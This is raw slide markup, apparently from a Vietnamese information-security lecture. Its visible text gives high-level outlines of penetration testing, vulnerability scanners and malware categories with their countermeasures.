              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6AAA19CA-1E77-493C-8A02-4635B2495222}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3279402" y="1990357"/>
            <a:ext cx="1290637" cy="1277937"/>
            <a:chOff x="4166" y="1706"/>
            <a:chExt cx="1252" cy="1252"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13331" name="Oval 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4BE0F68-6AC5-4BD2-B839-D1D9362B7298}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4166" y="1706"/>
              <a:ext cx="1252" cy="1252"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="636869"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3332" name="Oval 30">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F270B8DC-181B-4BC4-ACA3-2E9AF89F0ABA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4182" y="1713"/>
              <a:ext cx="1222" cy="1221"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="F1F5F5"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3333" name="Oval 31">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98ED6DE3-0AC4-400A-8DDE-699A8B403F7C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4195" y="1725"/>
              <a:ext cx="1162" cy="1141"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="AAB2B3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="48000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3334" name="Oval 32">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22A933BC-416A-4421-A5F6-A5F7BC707089}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4263" y="1757"/>
              <a:ext cx="1033" cy="926"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="FFFFFF"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="37999"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACC7996C-1DAD-46BA-AFF0-E5AB0FE4C58B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3288622" y="1988875"/>
            <a:ext cx="1313481"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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Công khai (Overt)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E24FB0D5-1C55-4526-B1DE-E4619F7002BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1600200" y="3927646"/>
            <a:ext cx="4528386"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sz="2400"/>
              <a:t>- Thảo luận về các mối đe dọa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>- Có quyền truy cập kiến thức nội bộ, hệ thống bảo mật</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>- Tiến hành các cuộc tấn công mà không bị chặn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCEDCB9A-6858-4986-8739-89E643B6A50E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6509587" y="3952539"/>
            <a:ext cx="4096814"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sz="2400"/>
              <a:t>- Thực hiện mà không có kiến thức về mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>- Đánh giá khả năng phát hiện và đáp ứng cuộc tấn công của đội an ninh.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="496353308"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="u"/>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25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDC3F8C0-0E3D-492D-AFFB-1B4E92702C21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6248400" y="381000"/>
            <a:ext cx="0" cy="0"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="360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82166395-F375-48BA-B55F-6A3C712C037E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1066801" y="1557339"/>
            <a:ext cx="5534026"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3000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3. Quét lỗ hổng</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{442BD2D7-2194-48F2-9F25-31C8EEDA231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40814" y="2018458"/>
            <a:ext cx="5859242" cy="3672409"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:softEdge rad="112500"/>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CFA85F8-D29A-4A53-8E67-C640774FA717}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6400800" y="2362200"/>
            <a:ext cx="4176713"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r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>quét lỗ hổng là công cụ tự động được sử dụng để xác định các lỗ hổng bảo mật ảnh hưởng đến một hệ thống hoặc ứng dụng nhất định. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:endParaRPr lang="en-US" altLang="en-US"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797166"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="u"/>
  </p:transition>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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>I. TỔNG QUAN NGUY CƠ GÂY MẤT AN TOÀN THÔNG TIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>II. LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IV. MỘT SỐ KIỂU TẤN CÔNG PHỔ BIẾN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2300876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4691">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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4691">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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1469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4691">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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14691">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="114691">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14691">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1" grpId="0" build="p"/>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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chế</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tán</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> vi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> virus, worm, trojan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>độc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bởi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> bot, spyware, rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Biện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="90886271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4691">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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4691">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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1469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4691">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11469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469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14691">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="114691">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1469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14691">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
